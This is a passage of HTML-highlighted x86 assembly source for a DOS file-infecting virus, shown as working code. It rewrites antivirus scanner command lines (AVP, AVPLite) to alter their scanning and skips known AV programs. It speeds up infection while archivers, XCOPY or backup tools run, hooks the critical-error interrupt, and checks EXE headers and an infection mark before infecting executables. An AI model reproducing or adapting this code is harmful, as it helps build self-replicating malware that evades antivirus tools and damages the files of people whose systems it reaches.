</span><span class="sc5">good_lpa</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; delete bad cmd</span><span class="sc0">
</span><span class="sc5">no_pause</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'on'</span><span class="sc0">                         </span><span class="sc1">; no (newonly) ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_news</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                           </span><span class="sc1">; a CR after 'no' ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">good_param</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                           </span><span class="sc1">; a space after it?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_news</span><span class="sc0">                         </span><span class="sc1">; if not maybe just a</span><span class="sc0">
                                                        </span><span class="sc1">; filemask, no param</span><span class="sc0">
</span><span class="sc5">good_param</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; delete bad cmd</span><span class="sc0">

</span><span class="sc5">no_news</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'en'</span><span class="sc0">                         </span><span class="sc1">; newonly?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmdline_loop</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'yl'</span><span class="sc0">                         </span><span class="sc1">; seems newonly?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmdline_loop</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">           </span><span class="sc1">; a CR after cmd ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">good_long</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">           </span><span class="sc1">; a space after it?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmdline_loop</span><span class="sc0">

</span><span class="sc5">good_long</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">; delete with some</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">           </span><span class="sc1">; spaces</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; delete bad cmd</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">cmdline_loop</span><span class="sc0">
</span><span class="sc5">end_cmdline</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">set_fast</span><span class="sc0">
</span><span class="sc5">no_tbsetup</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'IZKP'</span><span class="sc0">              </span><span class="sc1">; PKZIp running maybe?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">set_fast</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'.AHL'</span><span class="sc0">              </span><span class="sc1">; LHA running?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">set_fast</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'.RAR'</span><span class="sc0">              </span><span class="sc1">; RAR running?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">set_fast</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'.JRA'</span><span class="sc0">              </span><span class="sc1">; ARJ running?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">set_fast</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'POCX'</span><span class="sc0">              </span><span class="sc1">; XCOPy running?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">set_fast</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'KCAB'</span><span class="sc0">              </span><span class="sc1">; Backupper running?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">set_fast</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'.PVA'</span><span class="sc0">              </span><span class="sc1">; AVP running?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">nomem_toavp</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'LPVA'</span><span class="sc0">              </span><span class="sc1">; should be AVPLite?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_fast_now</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'.ETI'</span><span class="sc1">; really AVPLITE ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_fast_now</span><span class="sc0">

</span><span class="sc5">nomem_toavp</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; to params</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">    </span><span class="sc1">; adjust lenght of params</span><span class="sc0">

</span><span class="sc5">search_end</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">                  </span><span class="sc1">; end of params?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">search_end</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'/M/ '</span><span class="sc0">   </span><span class="sc1">; add ' /M/H' + CR</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">0d48h</span><span class="sc0">     </span><span class="sc1">; at the end of the</span><span class="sc0">
                                                     </span><span class="sc1">; avp command line</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_fast_now</span><span class="sc0">
</span><span class="sc5">set_fast</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fast_infection</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">no_fast_now</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_string_num</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; the AVs or such plus</span><span class="sc0">
                                                        </span><span class="sc1">; one last infected</span><span class="sc0">
                                                        </span><span class="sc1">; file (antibait)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fast_infection</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">normal_ab</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">; on fastinf just</span><span class="sc0">
                                                        </span><span class="sc1">; infect fast! :)</span><span class="sc0">
</span><span class="sc5">normal_ab</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mem_strings</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">avf_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; an AV ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_vir</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">avf_loop</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tmp_name</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vir_24handler</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">090h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; set our int24h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_24h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">              </span><span class="sc1">; get attribs</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; save attribs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">chmod_file</span><span class="sc0">              </span><span class="sc1">; reset attribs</span><span class="sc0">

                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">chmod_ok</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_vir_24</span><span class="sc0">

</span><span class="sc5">chmod_ok</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                </span><span class="sc1">; open for rw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_vir_att</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; get file time</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; read</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">head_buffer</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; MZ check</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_an_exe</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; infection mark</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SS'</span><span class="sc0">                         </span><span class="sc1">; already infected?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">not_an_exe</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc12">'@'</span><span class="sc0">        </span><span class="sc1">; no winexes</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">not_an_exe</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; no overlays</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_an_exe</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_exe</span><span class="sc0">

</span><span class="sc5">not_an_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                </span><span class="sc1">; set old time</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                  </span><span class="sc1">; close</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">

</span><span class="sc5">exit_vir_att</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">chmod_file</span><span class="sc0">              </span><span class="sc1">; set old attributes</span><span class="sc0">

</span><span class="sc5">exit_vir_24</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; set the old int24h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_24h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">090h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc5">exit_vir</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21h_ss</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21h_sp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; return to fast inf routine</span><span class="sc0">
                                                </span><span class="sc1">; or continue to exit_vir_vl</span><span class="sc0">
                                                </span><span class="sc1">; depending on how infection</span><span class="sc0">
                                                </span><span class="sc1">; was called</span><span class="sc0">
</span><span class="sc5">exit_vir_vl</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">chain_21h</span><span class="sc0">


</span><span class="sc5">chmod_file</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">infect_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; store CS:IP</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">original_ip</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">original_cs</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; store orig CS</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; store SS:SP</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">original_ss</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">original_sp</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; calculate real lenght</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseekfile</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">ok_lenght</span><span class="sc0">
</span><span class="sc5">exit_lenght</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
